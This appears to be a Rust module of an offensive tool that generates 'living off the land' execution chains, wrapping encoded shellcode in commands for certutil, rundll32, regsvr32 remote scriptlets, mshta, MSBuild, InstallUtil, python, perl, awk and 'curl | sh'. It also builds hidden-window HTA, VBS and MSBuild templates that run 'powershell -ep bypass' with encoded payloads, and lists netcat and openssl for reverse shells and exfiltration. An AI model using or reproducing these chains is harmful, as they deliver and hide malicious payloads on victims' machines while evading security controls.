use serde::{Deserialize, Serialize};

/// Target operating system for LOLBin chain generation.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum Platform {
    Windows,
    Linux,
}

impl std::fmt::Display for Platform {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Windows => write!(f, "windows"),
            Self::Linux => write!(f, "linux"),
        }
    }
}

/// Encoding scheme used to deliver a raw payload through a LOLBin.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum PayloadEncoding {
    Base64,
    XmlMsbuild,
    HtaMshta,
    VbsWscript,
    PerlEval,
    PythonExec,
    AwkSystem,
    CurlPipe,
}

impl std::fmt::Display for PayloadEncoding {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Base64 => write!(f, "base64"),
            Self::XmlMsbuild => write!(f, "xml-msbuild"),
            Self::HtaMshta => write!(f, "hta-mshta"),
            Self::VbsWscript => write!(f, "vbs-wscript"),
            Self::PerlEval => write!(f, "perl-eval"),
            Self::PythonExec => write!(f, "python-exec"),
            Self::AwkSystem => write!(f, "awk-system"),
            Self::CurlPipe => write!(f, "curl-pipe"),
        }
    }
}

/// A single known living-off-the-land binary with its abuse technique.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LolbinEntry {
    pub binary: String,
    pub technique: String,
    pub description: String,
}

/// One step in a LOLBin execution chain.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LolbinStep {
    pub command: String,
    pub binary: String,
    pub description: String,
    pub requires_admin: bool,
}

/// An ordered chain of LOLBin steps for a given platform.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LolbinChain {
    pub steps: Vec<LolbinStep>,
    pub platform: Platform,
}

/// Generates living-off-the-land binary chains that abuse signed OS
/// binaries to execute arbitrary payloads without dropping custom executables.
pub struct LolbinGenerator;

impl LolbinGenerator {
    pub fn new() -> Self {
        Self
    }

    pub fn generate_chain(platform: Platform, shellcode: &[u8]) -> LolbinChain {
        let encoded = Self::encode_payload(shellcode, PayloadEncoding::Base64);
        let steps = match platform {
            Platform::Windows => vec![
                Self::windows_certutil_decode(&encoded),
                Self::windows_rundll32("payload.dll", "DllMain"),
            ],
            Platform::Linux => vec![
                Self::linux_python_exec(&format!(
                    "import base64,ctypes;b=base64.b64decode('{}');(ctypes.c_char*len(b)).from_buffer_copy(b)",
                    encoded
                )),
            ],
        };
        LolbinChain { steps, platform }
    }

    pub fn windows_certutil_decode(_payload_b64: &str) -> LolbinStep {
        LolbinStep {
            command: "certutil -decode encoded.b64 payload.dll && del encoded.b64".to_string(),
            binary: "certutil.exe".to_string(),
            description: "Decode base64-encoded payload using certutil".to_string(),
            requires_admin: false,
        }
    }

    pub fn windows_regsvr32(url: &str) -> LolbinStep {
        LolbinStep {
            command: format!("regsvr32 /s /n /u /i:{} scrobj.dll", url),
            binary: "regsvr32.exe".to_string(),
            description: "Execute remote SCT payload via regsvr32 COM scriptlet".to_string(),
            requires_admin: false,
        }
    }

    pub fn windows_mshta(payload: &str) -> LolbinStep {
        LolbinStep {
            command: format!("mshta vbscript:Execute(\"{}\")(window.close)", payload),
            binary: "mshta.exe".to_string(),
            description: "Execute VBScript payload via mshta HTML application host".to_string(),
            requires_admin: false,
        }
    }

    pub fn windows_msbuild(payload_xml: &str) -> LolbinStep {
        LolbinStep {
            command: format!(
                "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe {}",
                payload_xml
            ),
            binary: "MSBuild.exe".to_string(),
            description: "Execute inline C# task via MSBuild project file".to_string(),
            requires_admin: false,
        }
    }

    pub fn windows_rundll32(dll_path: &str, entry: &str) -> LolbinStep {
        LolbinStep {
            command: format!("rundll32.exe {},{}", dll_path, entry),
            binary: "rundll32.exe".to_string(),
            description: "Load and execute DLL entry point via rundll32".to_string(),
            requires_admin: false,
        }
    }

    pub fn windows_installutil(exe_path: &str) -> LolbinStep {
        LolbinStep {
            command: format!(
                "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U {}",
                exe_path
            ),
            binary: "InstallUtil.exe".to_string(),
            description: "Execute .NET assembly via InstallUtil uninstall handler".to_string(),
            requires_admin: false,
        }
    }

    pub fn linux_python_exec(code: &str) -> LolbinStep {
        LolbinStep {
            command: format!("python3 -c \"{}\"", code),
            binary: "python3".to_string(),
            description: "Execute arbitrary Python code via command-line interpreter".to_string(),
            requires_admin: false,
        }
    }

    pub fn linux_perl_eval(code: &str) -> LolbinStep {
        LolbinStep {
            command: format!("perl -e '{}'", code),
            binary: "perl".to_string(),
            description: "Evaluate Perl expression via command-line".to_string(),
            requires_admin: false,
        }
    }

    pub fn linux_curl_pipe(url: &str) -> LolbinStep {
        LolbinStep {
            command: format!("curl -sSL {} | sh", url),
            binary: "curl".to_string(),
            description: "Download and pipe remote script to shell for execution".to_string(),
            requires_admin: false,
        }
    }

    pub fn linux_awk_system(command: &str) -> LolbinStep {
        LolbinStep {
            command: format!("awk 'BEGIN {{system(\"{}\")}}' /dev/null", command),
            binary: "awk".to_string(),
            description: "Execute system command via awk BEGIN block".to_string(),
            requires_admin: false,
        }
    }

    pub fn encode_payload(data: &[u8], encoding: PayloadEncoding) -> String {
        use base64_encode;
        let b64 = base64_encode(data);
        match encoding {
            PayloadEncoding::Base64 => b64,
            PayloadEncoding::XmlMsbuild => format!(
                r#"<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Run">
    <Exec Command="powershell -ep bypass -e {}" />
  </Target>
</Project>"#,
                b64
            ),
            PayloadEncoding::HtaMshta => format!(
                r#"<html><head><script language="VBScript">
Dim s: s = "powershell -ep bypass -e {}"
CreateObject("Wscript.Shell").Run s, 0
window.close
</script></head></html>"#,
                b64
            ),
            PayloadEncoding::VbsWscript => format!(
                r#"Dim s: s = "powershell -ep bypass -e {}"
CreateObject("Wscript.Shell").Run s, 0"#,
                b64
            ),
            PayloadEncoding::PerlEval => {
                format!("use MIME::Base64;eval(decode_base64('{}'))", b64)
            }
            PayloadEncoding::PythonExec => {
                format!("import base64;exec(base64.b64decode('{}'))", b64)
            }
            PayloadEncoding::AwkSystem => {
                format!("echo {} | base64 -d | sh", b64)
            }
            PayloadEncoding::CurlPipe => b64,
        }
    }

    /// Known Windows LOLBAS (Living Off The Land Binaries And Scripts) entries.
    pub fn lolbas_database() -> Vec<LolbinEntry> {
        vec![
            LolbinEntry {
                binary: "certutil.exe".to_string(),
                technique: "decode".to_string(),
                description: "Base64 decode files; download files via URL".to_string(),
            },
            LolbinEntry {
                binary: "regsvr32.exe".to_string(),
                technique: "execute".to_string(),
                description: "Execute COM scriptlets from remote URLs".to_string(),
            },
            LolbinEntry {
                binary: "mshta.exe".to_string(),
                technique: "execute".to_string(),
                description: "Execute HTA payloads with embedded VBScript/JScript".to_string(),
            },
            LolbinEntry {
                binary: "MSBuild.exe".to_string(),
                technique: "execute".to_string(),
                description: "Compile and execute inline C# tasks from project files".to_string(),
            },
            LolbinEntry {
                binary: "rundll32.exe".to_string(),
                technique: "execute".to_string(),
                description: "Load and call exported DLL functions".to_string(),
            },
            LolbinEntry {
                binary: "InstallUtil.exe".to_string(),
                technique: "execute".to_string(),
                description: "Execute .NET assemblies via uninstall handler".to_string(),
            },
            LolbinEntry {
                binary: "cmstp.exe".to_string(),
                technique: "execute".to_string(),
                description: "Execute commands via INF file scriptlet".to_string(),
            },
            LolbinEntry {
                binary: "msiexec.exe".to_string(),
                technique: "execute".to_string(),
                description: "Install MSI package from remote URL".to_string(),
            },
            LolbinEntry {
                binary: "wmic.exe".to_string(),
                technique: "execute".to_string(),
                description: "Execute XSL stylesheets with embedded JScript".to_string(),
            },
            LolbinEntry {
                binary: "bitsadmin.exe".to_string(),
                technique: "download".to_string(),
                description: "Download files via BITS transfer jobs".to_string(),
            },
        ]
    }

    /// Known Linux living-off-the-land binaries commonly abused for execution.
    pub fn linux_lolbins_database() -> Vec<LolbinEntry> {
        vec![
            LolbinEntry {
                binary: "python3".to_string(),
                technique: "execute".to_string(),
                description: "Arbitrary code execution via Python interpreter".to_string(),
            },
            LolbinEntry {
                binary: "perl".to_string(),
                technique: "execute".to_string(),
                description: "Eval arbitrary Perl expressions".to_string(),
            },
            LolbinEntry {
                binary: "curl".to_string(),
                technique: "download".to_string(),
                description: "Download and pipe remote payloads to shell".to_string(),
            },
            LolbinEntry {
                binary: "awk".to_string(),
                technique: "execute".to_string(),
                description: "System command execution via BEGIN block".to_string(),
            },
            LolbinEntry {
                binary: "bash".to_string(),
                technique: "execute".to_string(),
                description: "Direct shell command execution".to_string(),
            },
            LolbinEntry {
                binary: "php".to_string(),
                technique: "execute".to_string(),
                description: "Execute PHP code via command-line interpreter".to_string(),
            },
            LolbinEntry {
                binary: "ruby".to_string(),
                technique: "execute".to_string(),
                description: "Execute Ruby expressions via -e flag".to_string(),
            },
            LolbinEntry {
                binary: "wget".to_string(),
                technique: "download".to_string(),
                description: "Download remote payloads to disk".to_string(),
            },
            LolbinEntry {
                binary: "nc".to_string(),
                technique: "exfiltrate".to_string(),
                description: "Reverse shell and data exfiltration via netcat".to_string(),
            },
            LolbinEntry {
                binary: "openssl".to_string(),
                technique: "encrypt".to_string(),
                description: "Encrypted reverse shell via s_client".to_string(),
            },
        ]
    }
}

impl Default for LolbinGenerator {
    fn default() -> Self {
        Self::new()
    }
}

const BASE64_CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

fn base64_encode(data: &[u8]) -> String {
    let mut result = String::new();
    let chunks = data.chunks(3);
    for chunk in chunks {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let triple = (b0 << 16) | (b1 << 8) | b2;

        result.push(BASE64_CHARS[((triple >> 18) & 0x3F) as usize] as char);
        result.push(BASE64_CHARS[((triple >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 {
            result.push(BASE64_CHARS[((triple >> 6) & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
        if chunk.len() > 2 {
            result.push(BASE64_CHARS[(triple & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
    }
    result
}

/// Signed Windows LOLBAS binaries used for validation.
pub const WINDOWS_SIGNED_BINARIES: &[&str] = &[
    "certutil.exe",
    "regsvr32.exe",
    "mshta.exe",
    "MSBuild.exe",
    "rundll32.exe",
    "InstallUtil.exe",
    "cmstp.exe",
    "msiexec.exe",
    "wmic.exe",
    "bitsadmin.exe",
];

/// Standard Linux binaries commonly available on all distributions.
pub const LINUX_STANDARD_BINARIES: &[&str] = &[
    "python3", "perl", "curl", "awk", "bash", "php", "ruby", "wget", "nc", "openssl",
];
